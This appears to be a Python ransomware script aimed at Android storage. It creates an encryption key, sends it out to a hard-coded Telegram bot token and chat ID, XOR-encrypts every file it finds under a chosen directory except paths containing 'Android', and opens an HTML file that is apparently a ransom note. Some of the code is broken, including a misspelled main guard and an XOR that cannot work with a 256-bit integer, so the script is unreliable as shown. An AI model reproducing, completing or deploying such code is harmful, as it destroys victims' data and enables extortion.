import os
import requests
import subprocess

# Replace with your Android directory path
ANDROID_DIRECTORY = "/storage/emulated/0/"

# Generate or load the encryption key
key = None

KEY_FILE_PATH = os.path.join(ANDROID_DIRECTORY, "encryption_key.key")

if os.path.exists(KEY_FILE_PATH):
    with open(KEY_FILE_PATH, "rb") as key_file:
        key = key_file.read()
else:
    # Generate a random encryption key
    import random
    key = bytes([random.randint(0, 255) for _ in range(32)])
    with open(KEY_FILE_PATH, "wb") as key_file:
        key_file.write(key)

# Telegram bot token and chat ID
# Telegram bot token and chat ID
TOKEN = "6496457297:AAGW5yurO5n3agIGQzDpBaX8hwCxI4Ei0SE"
CHAT_ID = "6015288409"

def send_key_to_telegram(token, chat_id, key):
    try:
        key_str = key.hex()  # Convert key to a hexadecimal string
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {
            "chat_id": chat_id,
            "text": f"Encryption Key: {key_str}"
        }
        response = requests.get(url, params=params)
        if response.status_code == 200:
            print("Encryption key sent to Telegram.")
        else:
            print(f"Failed to send key to Telegram. Status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send key to Telegram: {str(e)}")

# Simple XOR encryption function
def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key for b in data])

def encrypt_file(file_path):
    try:
        if "Android" not in file_path:
            with open(file_path, "rb") as file:
                file_data = file.read()
            encrypted_data = xor_encrypt_decrypt(file_data, int.from_bytes(key, byteorder="big"))

            with open(file_path, "wb") as file:
                file.write(encrypted_data)
            print(f"File encrypted successfully: {file_path}")
        else:
            print(f"Skipped encryption for the 'Android' folder: {file_path}")
    except Exception as e:
        print(f"Encryption failed: {file_path}, Error: {str(e)}")

if __name__ == '__main':
    # Send the encryption key to Telegram
    try:
        send_key_to_telegram(TOKEN, CHAT_ID, key)
    except Exception as e:
        print(f"Failed to send the encryption key to Telegram: {str(e)}")

    action =  "encrypt"
    if action != "encrypt":
        print("Invalid action. Please enter 'encrypt' to encrypt files.")
    else:
        target_directory = input("Enter the directory path for file processing: ")
        for root, dirs, files in os.walk(target_directory):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                encrypt_file(file_path)

        # Open the provided HTML file with xdg-open
        html_file_path = "Dark.html"  # Replace with the path to your HTML file
        try:
            subprocess.call(['xdg-open', html_file_path])
        except Exception as e:
            print(f"Failed to open the HTML file with xdg-open: {str(e)}")
